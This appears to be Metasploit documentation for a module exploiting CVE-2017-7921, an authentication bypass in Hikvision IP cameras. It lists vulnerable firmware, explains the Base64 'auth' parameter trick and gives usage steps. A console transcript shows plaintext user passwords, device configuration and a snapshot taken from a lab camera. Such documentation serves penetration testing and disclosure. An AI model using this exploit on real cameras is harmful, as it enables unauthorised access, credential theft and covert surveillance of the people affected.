## Vulnerable Application

Many Hikvision IP cameras have improper authorization logic that allows unauthenticated information disclosure
of camera information, such as detailed hardware and software configuration, user credentials, and camera snapshots.

This module allows the attacker to disclose this information without the need of authenticaton by utilizing the
improper authentication logic to send a request to the server which contains an `auth` parameter in the query string
containing a Base64 encoded version of the authorization in `username:password` format.
Vulnerable cameras will ignore the `password` parameter and will instead use the username part of this string
as the user to log in. Using user `admin` will allow an attacker to retrieve and disclose any information
of the targeted device.

The vulnerability has been present in Hikvision products since 2014.
In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names.

Below is a list of vulnerable firmware, but many other white-labelled versions might be vulnerable.

* DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530
* DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401
* DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125
* DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414
* DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421
* DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928
* DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106

Installing a vulnerable test bed requires a Hikvision camera with the vulnerable firmware loaded.

## Verification Steps

This module has been tested against a Hikvision camera with the specifications listed below:

* MANUFACTURER: Hikvision.China
* MODEL: DS-2CD2142FWD-IS
* FIRMWARE VERSION: V5.4.1
* FIRMWARE RELEASE: build 160525
* BOOT VERSION: V1.3.4
* BOOT RELEASE: 100316

1. `use auxiliary/gather/hikvision_info_disclosure_cve_2017_7921`
1. `set RHOSTS <TARGET HOSTS>`
1. `set RPORT <port>`
1. `check`
1. `set PRINT true`
1. `set ACTION Automatic`
1. `run`
1. You should get a full disclosure of all camera information supported by this module.

## Options
### PRINT
This option allows you print all information collected to the console during execution except for
camera snapshots.

## Actions
### Automatic
Retrieves all information suported by this module
### Configuration
Retrieves the camera hardware and software configuration
### Credentials
Retrieves all configured users including the passwords in plain text format and stores them in the database.
This can be checked by using the command `creds -O <target IP>` at the Metasploit prompt.
### Snapshot
Takes a camera snapshot and stores it as a JPEG file in loot.

All information disclosed is by default stored in loot

## Scenarios

### Hikvision Camera DS-2CD2142FWD-IS -> firmware version V5.4.1, build 160525

```
msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set rhosts 192.168.100.180
rhosts => 192.168.100.180
msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set ACTION Automatic
ACTION => Automatic
msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > set PRINT true
PRINT => true
msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > options

Module options (auxiliary/gather/hikvision_info_disclosure_cve_2017_7921):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PRINT    true             no        Print output to console (not applicable for snapshot)
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.100.180  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Auxiliary action:

   Name       Description
   ----       -----------
   Automatic  Dump all information


msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > check
[+] 192.168.100.180:80 - The target is vulnerable.
msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > run
[*] Running module against 192.168.100.180

[*] Running in automatic mode
[*] Getting the user credentials...
[*] Credentials for user:admin are added to the database...
[*] Credentials for user:admln are added to the database...
[*] User Credentials Information:
-----------------------------
Username:admin | ID:1 | Role:Administrator | Password: Pa$$W0rd
Username:admln | ID:2 | Role:Operator | Password: asdf1234

[+] User credentials are successfully saved to /root/.msf4/loot/20221002172346_default_192.168.100.180_hikvision.creden_049224.txt
[*] Getting the camera hardware and software configuration...
[*] Camera Device Information:
--------------------------
Device name: IP CAMERA
Device ID: 88
Device description: IPCamera
Device manufacturer: Hikvision.China
Device model: DS-2CD2142FWD-IS
Device S/N: DS-2CD2142FWD-IS2016HS77777777777
Device MAC: bc:ad:28:ff:ff:ff
Device firware version: V5.4.1
Device firmware release: build 160525
Device boot version: V1.3.4
Device boot release: 100316
Device hardware version: 0x0

Camera Network Information:
---------------------------
IP interface: 1
IP version: v4
IP assignment: static
IP address: 192.168.100.180
IP subnet mask: 255.255.255.0
Default gateway: 192.168.100.1
Primary DNS: 8.8.8.8

Camera Storage Information:
---------------------------
Storage volume name: HDD1
Storage volume ID: 1
Storage volume description: DAS
Storage device: HDD
Storage type: internal
Storage capacity (MB): 30543
Storage device status: HD_NORMAL

[+] Camera configuration details are successfully saved to /root/.msf4/loot/20221002172347_default_192.168.100.180_hikvision.config_549113.txt
[*] Taking a camera snapshot...
[+] Camera snapshot is successfully saved to /root/.msf4/loot/20221002172348_default_192.168.100.180_hikvision.image_963468.bin
[*] Auxiliary module execution completed

msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) > creds -O 192.168.100.180
Credentials
===========

host             origin           service        public  private   realm  private_type  JtR Format
----             ------           -------        ------  -------   -----  ------------  ----------
192.168.100.180  192.168.100.180  80/tcp (http)  admln   asdf1234         Password
192.168.100.180  192.168.100.180  80/tcp (http)  admin   Pa$$W0rd         Password

msf6 auxiliary(gather/hikvision_info_disclosure_cve_2017_7921) >
```

## Limitations
No limitations are identified so far using this module.
